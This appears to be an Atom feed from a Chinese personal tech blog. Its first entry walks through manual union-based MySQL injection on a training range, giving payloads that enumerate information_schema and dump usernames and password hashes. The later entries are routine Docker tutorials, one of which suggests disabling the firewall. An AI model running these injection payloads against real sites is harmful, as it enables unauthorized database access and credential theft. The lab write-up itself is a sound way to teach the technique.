<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>顾北清</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.gubeiqing.cn/"/>
  <updated>2019-10-04T05:47:37.540Z</updated>
  <id>https://www.gubeiqing.cn/</id>
  
  <author>
    <name>顾北清</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Mysql基础注入</title>
    <link href="https://www.gubeiqing.cn/2019/06/14/mysql05/"/>
    <id>https://www.gubeiqing.cn/2019/06/14/mysql05/</id>
    <published>2019-06-14T14:21:16.000Z</published>
    <updated>2019-10-04T05:47:37.540Z</updated>
    
    <content type="html"><![CDATA[<p><strong>实验环境：墨者学院Mysql手工注入漏洞测试靶场</strong><br>后台源码没有进行任何字符过滤。</p><p>首先进入靶场环境<br><img alt data-src="https://image.3001.net/images/20190614/15605103136843.jpg" class="lozad"><br>先用<code>admin</code>弱密码登陆试试<br><img alt data-src="https://image.3001.net/images/20190614/15605162158713.jpg" class="lozad"><br>果然不行，这时看到用户登录下方有一个停机维护通知，点进去瞅瞅<br><img alt data-src="https://image.3001.net/images/20190614/15605104475821.jpg" class="lozad"><br>看到这里链接上有<code>id = 1</code>,怀疑这里会有注入点。</p><h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>先简单判断是不是字符型注入点，使用单引号闭合语句,注释后面的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = 1&apos;--+</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/15605106681494.jpg" class="lozad"><br>发现页面有异常，可能不是字符型，再试试数字型注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = 1 and 1 = 1</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/15605107834469.jpg" class="lozad"><br>发现<code>and 1 = 1</code>没有返回异常，再进一步进行判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = 1 and 1 = 2</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/15605108646837.jpg" class="lozad"><br>页面出现异常，说明这里存在数字型注入点</p><h4 id="猜解字段数"><a href="#猜解字段数" class="headerlink" title="猜解字段数"></a>猜解字段数</h4><p>发现存在注入点之后使用<code>order by</code>语句判断字段的数目。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 3</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/1560511160681.jpg" class="lozad"><br>先试一下是不是3列，发现没有报错，说明至少存在3列，接着猜解。<br><img alt data-src="https://image.3001.net/images/20190614/1560511220341.jpg" class="lozad"><br>尝试到5发现报错了，因为字段没有5列，使用<code>order by</code>时无法根据第5列排序，所以出错，由此判断字段数目是4.</p><p>####联合查询<br>因为猜解出来的字段数是4，所以联合查询的语句应该这么写<code>?id=1 union select 1,2,3,4</code>,但因为这个语句是成立的，为了让页面爆出我们需要的字段，这里就需要构造一个错误的语句，让数据库报错时返回我们需要的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/15605148841175.jpg" class="lozad"><br>可以看到这里页面上爆出了2和3两个数字，说明2和3两个数字对应当前数据表的两个字段会回显到页面上的，这样就可以根据2，3两个回显位查询一些我们需要的信息。<br>常用的Mysql系统函数有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">version()            #MySQL版本</span><br><span class="line">user()               #数据库用户名</span><br><span class="line">database()           #数据库名</span><br><span class="line">@@datadir            #数据库路径</span><br><span class="line">@@version_compile_os #操作系统版本</span><br></pre></td></tr></table></figure><p>比如查询当前的数据库名称和当前用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),user(),4</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/1560515289332.jpg" class="lozad"><br>这样我们就成功查询到当前数据库，接着找这个数据库里的数据表。</p><h4 id="查询数据表"><a href="#查询数据表" class="headerlink" title="查询数据表"></a>查询数据表</h4><p>补充1：数据库关键库<br>这里需要使用到数据库中一个重要的库<code>information_schema</code>，这个库下面的<code>schemadata</code>表中存放着所有数据库的信息，其中<code>schema_name</code>列中保存着所有数据库名，<code>tables</code>表中存放着所有数据表的信息，其中<code>table_schema</code>列存放着数据库名，<code>table_name</code>列存放着数据表名，<code>columns</code>表中存放着所有数据表的所有列信息，其中<code>column_name</code>存放着所有列名，<code>table_name</code>存放着表名。<br>补充2：concat函数的用法</p><p>1.concat(str1,str2)<br>将多个结果一行返回。如有任何一个参数为NULL ，则返回值为 NULL。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3;</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select concat(1,2,3);</span><br><span class="line">+---------------+</span><br><span class="line">| concat(1,2,3) |</span><br><span class="line">+---------------+</span><br><span class="line">| 123           |</span><br><span class="line">+---------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>2.concat_ws(separator,str1,str2)<br>concat_ws是concat()的特殊形式。第一个参数是其它参数的分隔符,分隔符可以是一个字符串，也可以是其它参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(&apos;~&apos;,1,2,3);</span><br><span class="line">+----------------------+</span><br><span class="line">| concat_ws(&apos;~&apos;,1,2,3) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 1~2~3                |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>3.group_concat完整语法如下，默认使用逗号分隔多个结果：<br>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator ‘分隔符’] )</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_name = database()</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/15605155258786.jpg" class="lozad"><br>这样就查询到当前数据库里面有两个数据表，分别为<code>StormGroup_member</code>,<code>notice</code>。</p><h4 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&apos;StormGroup_member&apos;</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/15605156481273.jpg" class="lozad"><br>查询到有这个表有四个字段<code>id</code>,<code>name</code>,<code>password</code>,<code>status</code>。</p><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><p>根据上面查询到的四个字段查询数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,concat_ws(&apos;~&apos;,id,name,password,status),3,4 from StormGroup_member</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/15605157848912.jpg" class="lozad"><br>成功查到账号密码，不过这个密码好像是加密的，先进行解密<br><img alt data-src="https://image.3001.net/images/20190614/15605159017760.jpg" class="lozad"><br>使用这个账号密码登陆试试<br><img alt data-src="https://image.3001.net/images/20190614/15605160192900.jpg" class="lozad"><br>最后尴尬的一幕出现了(/哭)。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;实验环境：墨者学院Mysql手工注入漏洞测试靶场&lt;/strong&gt;&lt;br&gt;后台源码没有进行任何字符过滤。&lt;/p&gt;
&lt;p&gt;首先进入靶场环境&lt;br&gt;&lt;img alt data-src=&quot;https://image.3001.net/images/20190614
      
    
    </summary>
    
      <category term="Mysql" scheme="https://www.gubeiqing.cn/categories/Mysql/"/>
    
    
      <category term="安全" scheme="https://www.gubeiqing.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="Mysql" scheme="https://www.gubeiqing.cn/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>手动搭建Docker本地私有镜像仓库</title>
    <link href="https://www.gubeiqing.cn/2018/10/27/docker14/"/>
    <id>https://www.gubeiqing.cn/2018/10/27/docker14/</id>
    <published>2018-10-27T13:08:34.000Z</published>
    <updated>2019-10-04T04:00:39.403Z</updated>
    
    <content type="html"><![CDATA[<p><strong>实验环境：两个Centos7虚拟机，一个是Server，用作客户端，另一个是Registry，用作Docker私有镜像仓库。</strong></p><h1 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h1><p>查看一下两台虚拟机的IP地址。<br>Server的IP地址是<code>192.168.134.151</code>。<br><img alt data-src="https://image.3001.net/images/20181123/15429710403199.jpg" class="lozad"></p><p>Registry的IP地址是<code>192.168.134.150</code>。<br><img alt data-src="https://image.3001.net/images/20181123/154297104291.jpg" class="lozad"></p><p>使用<code>setenforce 0</code>临时关闭<code>SElinux</code>。</p><p><strong>打开<code>Server</code>和<code>Registry</code>的内核转发功能</strong><br>编辑配置文件<code>/etc/sysctl.conf</code>，添加下面的内容： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward = 1 </span><br><span class="line">net.ipv4.conf.default.rp_filter = 0 </span><br><span class="line">net.ipv4.conf.all.rp_filter = 0</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20181123/15429710432205.jpg" class="lozad"><br>修改完成后使用<code>sysctl –p</code>命令生效。<br><img alt data-src="https://image.3001.net/images/20181123/15429710455813.jpg" class="lozad"></p><h1 id="Docker配置"><a href="#Docker配置" class="headerlink" title="Docker配置"></a>Docker配置</h1><h2 id="Docker环境安装"><a href="#Docker环境安装" class="headerlink" title="Docker环境安装"></a>Docker环境安装</h2><p>在<code>Server</code>和<code>Registry</code>两台机器上使用<code>yum install -y docker</code>命令安装docker环境。<br><img alt data-src="https://image.3001.net/images/20181123/15429710473328.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429710492085.jpg" class="lozad"></p><h2 id="配置Docker配置文件"><a href="#配置Docker配置文件" class="headerlink" title="配置Docker配置文件"></a>配置Docker配置文件</h2><p>在<code>Server</code>和<code>Registry</code>上编辑<code>/etc/sysconfig/docker</code>文件添加如下两行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ADD_REGISTRY=&apos;--add-registry 192.168.134.150:5000&apos; </span><br><span class="line">INSECURE_REGISTRY=&apos;--insecure-registry 192.168.134.150:5000&apos;</span><br></pre></td></tr></table></figure><p>这里是将<code>docker image</code>的获取地址改为从本地私有<code>Registry</code>获取。<br><img alt data-src="https://image.3001.net/images/20181123/15429710514384.jpg" class="lozad"><br>使用<code>systemctl restart docker</code>命令重启一下docker。</p><h2 id="设置Docker服务"><a href="#设置Docker服务" class="headerlink" title="设置Docker服务"></a>设置Docker服务</h2><p>设置docker开机自启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20181123/15429710522984.jpg" class="lozad"></p><h2 id="配置镜像仓库"><a href="#配置镜像仓库" class="headerlink" title="配置镜像仓库"></a>配置镜像仓库</h2><p>先把等会要用到的两个镜像的tar包放到<code>/root</code>目录下。<br><img alt data-src="https://image.3001.net/images/20181123/15429710541483.jpg" class="lozad"></p><p>接着手动加载镜像,加载<code>registry</code>镜像并使用再将他上传至私有镜像仓库，因为<code>registry</code>容器要用于其他容器的注册，所以先将他启动。<strong>搭建私有镜像仓库必须要先将registry容器启动</strong>。<br>使用的命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker load &lt; registry_latest.tar   //加载镜像</span><br><span class="line">docker images  //查看刚刚加载的镜像的ID</span><br><span class="line">docker run -d -p 5000:5000 --restart=always --name registry registry:latest  //启动registry容器</span><br><span class="line">docker tag 镜像ID registry:latest  //给registry镜像打上新tag（可以省去此步）</span><br><span class="line">docker push registry:latest   //将registry镜像上传至私有镜像仓库（可以省去此步）</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20181123/15429710564731.jpg" class="lozad"><br>这时使用<code>docker images</code>查看一下本地镜像。<br><img alt data-src="https://image.3001.net/images/20181123/15429710598559.jpg" class="lozad"></p><p>可以看到下面一个就是我刚刚重新打tag的镜像。</p><p>现在上传一个owncloud镜像。<br><img alt data-src="https://image.3001.net/images/20181123/15429710612263.jpg" class="lozad"><br>这里可以看到上传完之后的镜像是没有tag的，所以我们给他打上tag，就可以看出来了。<br><img alt data-src="https://image.3001.net/images/20181123/15429710635798.jpg" class="lozad"><br>接着将他上传至私有镜像仓库。<br>全部命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker load &lt; owncloud.tar   //加载镜像</span><br><span class="line">docker images  //查看刚刚加载的镜像的ID</span><br><span class="line">docker tag 镜像ID owncloud:latest  //给owncloud镜像打上tag</span><br><span class="line">docker push owncloud:latest   //将owncloud镜像上传至私有镜像仓库</span><br></pre></td></tr></table></figure><p>我这里私有镜像仓库的默认位置在<code>/var/lib/docker/volumes/022dbe58afaec96083a1ceb3fb6672c7a62be38a5a48158322d75d2e6b1150c3/_data/docker/registry/v2/repositories/</code>下。<br>查看一下<br><img alt data-src="https://image.3001.net/images/20181123/1542971064510.jpg" class="lozad"><br>这里可以看到我上传至私有镜像仓库的镜像文件。</p><h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>验证一下私有镜像是否搭建成功<br>到server上拉取owncloud镜像试一下。<br><img alt data-src="https://image.3001.net/images/20181123/15429710671020.jpg" class="lozad"><br>这里可以看到他是从<code>192.168.134.150 Registry</code>镜像仓库拉取的镜像。<br>到此实验成功！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;实验环境：两个Centos7虚拟机，一个是Server，用作客户端，另一个是Registry，用作Docker私有镜像仓库。&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;基础配置&quot;&gt;&lt;a href=&quot;#基础配置&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="Docker" scheme="https://www.gubeiqing.cn/categories/Docker/"/>
    
    
      <category term="Docker" scheme="https://www.gubeiqing.cn/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu下使用Tim/Wechat</title>
    <link href="https://www.gubeiqing.cn/2018/10/27/docker13/"/>
    <id>https://www.gubeiqing.cn/2018/10/27/docker13/</id>
    <published>2018-10-27T13:07:11.000Z</published>
    <updated>2019-10-04T04:02:10.164Z</updated>
    
    <content type="html"><![CDATA[<p><strong>实验环境：Ubuntu 16.04桌面版root用户下</strong></p><h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><ul><li><p>配置Docker的apt源<br><code>$ sudo apt-get install apt-transport-https ca-certificates curl software-properties-commo</code></p></li><li><p>添加 Docker 官方的 GPG<br><code>$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></p></li><li><p>添加Docker源<br><code>$ sudo add-apt-repository  &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu  $(lsb_release -cs) stable&quot;</code></p></li><li><p>安装Docker<br><code>$ sudo apt-get update</code><br><code>$ sudo apt-get install docker-ce</code></p></li></ul><p>首先运行QQ容器</p><p>先执行<code>xhost +</code>命令，不然QQ的界面无法弹出。</p><p><img alt data-src="https://image.3001.net/images/20181123/15429708926060.jpg" class="lozad"></p><p>接着执行下面的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name qq \</span><br><span class="line">docker run -d --name qq \</span><br><span class="line">--device /dev/snd \</span><br><span class="line">-v /tmp/.X11-unix:/tmp/.X11-unix \</span><br><span class="line">-v $HOME/TencentFiles:/TencentFiles \</span><br><span class="line">-e DISPLAY=unix$DISPLAY \</span><br><span class="line">-e XMODIFIERS=@im=fcitx \</span><br><span class="line">-e QT_IM_MODULE=fcitx \</span><br><span class="line">-e GTK_IM_MODULE=fcitx \</span><br><span class="line">-e AUDIO_GID=`getent group audio | cut -d: -f3` \</span><br><span class="line">-e VIDEO_GID=`getent group video | cut -d: -f3` \</span><br><span class="line">-e GID=`id -g` \</span><br><span class="line">-e UID=`id -u` \</span><br><span class="line">bestwu/qq:office</span><br></pre></td></tr></table></figure><p>启动完成之后就可以看到Tim的登录界面了。</p><p><img alt data-src="https://image.3001.net/images/20181123/15429708946413.jpg" class="lozad"></p><p>下次再启动QQ时输入<code>docker start qq</code>就好了。</p><p><img alt data-src="https://image.3001.net/images/20181123/15429708969843.jpg" class="lozad"></p><p>同理可以使用下面的命令还可以安装微信。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> docker run -d --name wechat \</span><br><span class="line"> docker run -d --name wechat \</span><br><span class="line"> --device /dev/snd \</span><br><span class="line"> -v /tmp/.X11-unix:/tmp/.X11-unix \</span><br><span class="line"> -v $HOME/TencentFiles:/TencentFiles \</span><br><span class="line"> -e DISPLAY=unix$DISPLAY \</span><br><span class="line"> -e XMODIFIERS=@im=fcitx \</span><br><span class="line"> -e QT_IM_MODULE=fcitx \</span><br><span class="line"> -e GTK_IM_MODULE=fcitx \</span><br><span class="line"> -e AUDIO_GID=`getent group audio | cut -d: -f3` \</span><br><span class="line"> -e VIDEO_GID=`getent group video | cut -d: -f3` \</span><br><span class="line"> -e GID=`id -g` \</span><br><span class="line"> -e UID=`id -u` \</span><br><span class="line">bestwu/wechat</span><br></pre></td></tr></table></figure><p>不过微信关闭后再次启动的命令是<code>docker start wechat</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;实验环境：Ubuntu 16.04桌面版root用户下&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;安装Docker&quot;&gt;&lt;a href=&quot;#安装Docker&quot; class=&quot;headerlink&quot; title=&quot;安装Docker&quot;&gt;&lt;/a&gt;安装Docker&lt;/
      
    
    </summary>
    
      <category term="Docker" scheme="https://www.gubeiqing.cn/categories/Docker/"/>
    
    
      <category term="Linux" scheme="https://www.gubeiqing.cn/tags/Linux/"/>
    
      <category term="Dokcer" scheme="https://www.gubeiqing.cn/tags/Dokcer/"/>
    
  </entry>
  
  <entry>
    <title>Docker+Nextcloud快速部署个人网盘</title>
    <link href="https://www.gubeiqing.cn/2018/10/08/cloud04/"/>
    <id>https://www.gubeiqing.cn/2018/10/08/cloud04/</id>
    <published>2018-10-08T06:58:33.000Z</published>
    <updated>2019-10-04T04:05:20.186Z</updated>
    
    <content type="html"><![CDATA[<p>各位大佬好，，，萌新顾北清又回来更新了，今天要<strong>快速</strong>部署一个人网盘。<br>有多快呢，，，5分钟吧，因为我们使用Docker部署。<br>Docker基础可以看看我之前的博文。（<a href="http://www.gubeiqing.cn/2018/06/03/docker01/">点这里点这里</a>）<br>那么，，，开始吧。</p><p><strong>实验环境：小伙伴的阿里云服务器，安装的是Centos7的系统，要安装的网盘叫<code>Nextcloud</code></strong></p><p>下面开始安装<br><strong>第一步</strong><br>老规矩，先安装<code>Docker</code>环境.<br>命令如下：</p><pre><code>[root@izt8mvnno1ny1dz ~]# yum install -y dockerLoaded plugins: fastestmirrorbase                                                                                                                                    | 3.6 kB  00:00:00epel                                                                                                                                    | 3.2 kB  00:00:00extras                                                                                                                                  | 3.4 kB  00:00:00updates                                                                                                                                 | 3.4 kB  00:00:00Loading mirror speeds from cached hostfilePackage 2:docker-1.13.1-74.git6e3bb8e.el7.centos.x86_64 already installed and latest versionNothing to do</code></pre><p>我这里已经安装完成就不重复安装了。<br>启动docker并设置自启：</p><pre><code>[root@izt8mvnno1ny1dz ~]# systemctl start docker[root@izt8mvnno1ny1dz ~]# systemctl enable docker</code></pre><p><strong>第二步</strong><br>查找<code>Nextcloud</code>网盘的镜像</p><pre><code>[root@izt8mvnno1ny1dz ~]# docker search nextcloudINDEX       NAME                                      DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDdocker.io   docker.io/nextcloud                       A safe home for all your data                   561       [OK]docker.io   docker.io/linuxserver/nextcloud           A Nextcloud container, brought to you by L...   81docker.io   docker.io/greyltc/nextcloud               Nextcloud: a safe home for all your data. ...   38                   [OK]docker.io   docker.io/wonderfall/nextcloud            All-in-one alpine-based Nextcloud image.        36                   [OK]docker.io   docker.io/rootlogin/nextcloud             Nextcloud docker image running on top of N...   17                   [OK]docker.io   docker.io/lsioarmhf/nextcloud             ARMHF based Linuxserver.io image of nextcloud   9docker.io   docker.io/arm32v7/nextcloud               A safe home for all your data                   8docker.io   docker.io/benyanke/nextcloud              Fork of wonderfall/nextcloud, since it is ...   7                    [OK]docker.io   docker.io/ownyourbits/nextcloudpi         NextCloud ARM docker container                  7docker.io   docker.io/sameersbn/nextcloud             Dockerized Nextcloud                            7                    [OK]docker.io   docker.io/ownyourbits/nextcloudpi-armhf   NextCloudPi ARM docker container                6docker.io   docker.io/hoellen/nextcloud               Based on wonderfall/nextcloud                   5                    [OK]docker.io   docker.io/aheimsbakk/nextcloud            DEPRECATED in favor of the Nextcloud webin...   2                    [OK]docker.io   docker.io/crazymax/nextcloud              Nextcloud Docker image based on Alpine Lin...   1docker.io   docker.io/lsioarmhf/nextcloud-aarch64     ARM64 based Linuxserver.io image of nextcl...   1docker.io   docker.io/zerpex/nextcloud-ocdl           Nextcloud with ocDownloader pre-requiresites    1                    [OK]docker.io   docker.io/avhost/docker-nextcloud         nextcloud as docker service                     0                    [OK]docker.io   docker.io/bunix42/nextcloud               Docker Image for Nextcloud, based on the o...   0docker.io   docker.io/dheaps/nextcloud-cron           Cron service for Nextcloud                      0                    [OK]docker.io   docker.io/ftsystems/nextcloud             Nextcloud container based on the owncloud ...   0docker.io   docker.io/gorlug/nextcloud                https://nextcloud.com/                          0                    [OK]docker.io   docker.io/sesceu/nextcloud                nextcloud with cron and imap-auth               0                    [OK]docker.io   docker.io/trollin/nextcloud                                                               0docker.io   docker.io/whatwedo/nextcloud              Nextcloud powered by Apache                     0                    [OK]docker.io   docker.io/zyrill/nextcloud                 Nextcloud v12 based on php:fpm-alpine          0</code></pre><p>依旧老规矩，使用官方镜像</p><p><strong>第三步</strong><br>拉取官方的Docker镜像</p><pre><code>[root@izt8mvnno1ny1dz ~]# docker pull docker.io/nextcloudUsing default tag: latestTrying to pull repository docker.io/library/nextcloud ...latest: Pulling from docker.io/library/nextcloud802b00ed6f79: Already exists59f5a5a895f8: Pull complete6898b2dbcfeb: Pull complete8e0903aaa47e: Pull complete2961af1e196a: Pull complete71f7016f79a0: Pull complete5e1a48e5719c: Pull complete7ae5291984f3: Pull complete725b65166f31: Pull completee90b121f9520: Pull completeb5a272809bbd: Pull completef045f3ae0e2b: Pull complete7f51c9ea2d8e: Pull complete5aa9d0ed164a: Pull complete8eea44e2bfc7: Pull complete5302ebd5abce: Pull complete78f0335decb3: Pull complete1a2f85124682: Pull completeed4cec78a159: Pull completea68e1b656d3d: Pull completed0b66f00fda7: Pull complete45c9777c18b5: Pull completeDigest: sha256:c8d1091cc86051dc5e8de0114e3121fe0562cb417c56f2644ed92838008d8806Status: Downloaded newer image for docker.io/nextcloud:latest</code></pre><p>镜像拉取完成</p><p><strong>第四步</strong><br>容器拉取到本地之后，就该启用容器了。</p><pre><code>[root@izt8mvnno1ny1dz ~]# docker run -d --restart=always --name nextcloud -p 80:80 -v /root/nextcloud:/data docker.io/nextcloudae96013c7f0ab05194a4488d1fa61b1c6274c272a53b3d418418b56a88e2e230[root@izt8mvnno1ny1dz ~]# docker ps -aCONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                NAMESae96013c7f0a        docker.io/nextcloud   &quot;/entrypoint.sh ap...&quot;   6 seconds ago       Up 6 seconds        0.0.0.0:80-&gt;80/tcp   nextcloud</code></pre><p>这里可以看到已经在后台运行了，这就部署好了。</p><p><strong>第五步</strong><br>在浏览器地址栏输入你的IP地址，可以访问到<code>Nextcloud</code>的<code>Web</code>页面。<br><img alt data-src="https://image.3001.net/images/20181123/15429718173586.jpg" class="lozad"><br>如果访问不到，先重启一下docker服务，命令如下：</p><pre><code>[root@izt8mvnno1ny1dz ~]# systemctl restart docker</code></pre><p>如果还是不行，那么就关闭防火墙服务吧。</p><pre><code>[root@izt8mvnno1ny1dz ~]# systemctl stop firewalld[root@izt8mvnno1ny1dz ~]# systemctl status firewalld    //查看一下防火墙状态● firewalld.service - firewalld - dynamic firewall daemonLoaded: loaded (/usr/lib/systemd/system/firewalld.service; disabled; vendor preset: enabled)Active: inactive (dead)    Docs: man:firewalld(1)Sep 20 13:44:49 izt8mvnno1ny1dz systemd[1]: Starting firewalld - dynamic firewall daemon...Sep 20 13:44:50 izt8mvnno1ny1dz systemd[1]: Started firewalld - dynamic firewall daemon.Sep 20 13:44:57 izt8mvnno1ny1dz systemd[1]: Stopping firewalld - dynamic firewall daemon...Sep 20 13:44:57 izt8mvnno1ny1dz systemd[1]: Stopped firewalld - dynamic firewall daemon.Sep 20 15:33:49 izt8mvnno1ny1dz systemd[1]: Starting firewalld - dynamic firewall daemon...Sep 20 15:33:49 izt8mvnno1ny1dz systemd[1]: Started firewalld - dynamic firewall daemon.Sep 20 15:34:58 izt8mvnno1ny1dz systemd[1]: Stopping firewalld - dynamic firewall daemon...Sep 20 15:34:58 izt8mvnno1ny1dz systemd[1]: Stopped firewalld - dynamic firewall daemon.</code></pre><p>接着完成完成网盘管理员账号的注册，使用默认数据库（当然，也可以起一个<code>Mysql</code>的容器，用来连接），然后完成注册，就可以登录了。<br><img alt data-src="https://image.3001.net/images/20181123/15429718196488.jpg" class="lozad"><br>这样就愉快的搭建完成了，是不是五分钟快速搭建！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;各位大佬好，，，萌新顾北清又回来更新了，今天要&lt;strong&gt;快速&lt;/strong&gt;部署一个人网盘。&lt;br&gt;有多快呢，，，5分钟吧，因为我们使用Docker部署。&lt;br&gt;Docker基础可以看看我之前的博文。（&lt;a href=&quot;http://www.gubeiqing.cn
      
    
    </summary>
    
      <category term="Cloud" scheme="https://www.gubeiqing.cn/categories/Cloud/"/>
    
    
      <category term="Cloud" scheme="https://www.gubeiqing.cn/tags/Cloud/"/>
    
      <category term="Docker" scheme="https://www.gubeiqing.cn/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>KVM使用</title>
    <link href="https://www.gubeiqing.cn/2018/10/08/cloud03/"/>
    <id>https://www.gubeiqing.cn/2018/10/08/cloud03/</id>
    <published>2018-10-08T06:57:06.000Z</published>
    <updated>2019-10-04T04:05:18.713Z</updated>
    
